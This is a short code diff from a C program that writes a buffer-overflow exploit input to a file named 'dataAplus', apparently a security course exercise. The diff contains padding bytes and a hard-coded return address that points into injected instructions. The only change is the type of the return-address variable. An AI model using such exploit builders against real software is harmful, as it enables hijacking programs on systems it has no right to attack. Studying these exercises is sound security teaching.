@@ -31,7 +31,7 @@ int main() {
     char paddingfinal[] = "gggggggg";
 
     /* Return address that points to the top of the instructions */
-    unsigned int returnAddress = 0x420074;
+    long returnAddress = 0x420074;
 
     /* Create a file */
     FILE *psFile = fopen("dataAplus", "w");
